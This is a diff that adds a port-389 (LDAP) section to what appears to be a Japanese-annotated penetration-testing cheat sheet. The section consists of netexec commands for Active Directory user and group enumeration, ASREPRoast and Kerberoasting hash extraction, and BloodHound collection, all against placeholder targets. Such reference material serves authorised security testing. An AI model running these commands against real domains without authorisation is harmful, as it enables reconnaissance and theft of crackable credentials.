@@ -5,6 +5,38 @@
 ## 135
 
 
+## 389
+netexec
+```sh
+# Authentication
+netexec ldap 'IP' -u 'USERNAMELIST' -p '' -k
+# Enumerate Domain Users
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export users.txt
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --active-users
+# Enumerate Domain Groups
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --groups
+# Find Domain SID
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --get-sid
+# ASREPRoast (TCP88番も必要)
+netexec ldap 'IP' -u 'USERNAMELIST' -p '' --kdchost 'IP' --asreproast asreproast.txt
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdchost 'IP' --asreproast asreproast.txt
+# Kerberoasting (TCP88番も必要)
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdchost 'IP' --kerberoasting kerberoast.txt
+# Admin Count
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --admin-count
+# Machine Account Quota
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M maq
+# Get User Descriptions
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M get-desc-users
+# Read DACL Rights
+https://www.netexec.wiki/ldap-protocol/read-dacl-right
+# Bloodhound Ingestor
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection All
+# List DC IP / Enum Trust
+netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dc-list
+```
+
+
 ## 445
 netexec(rpcを使用するためTCP135番も使う)
 ```sh
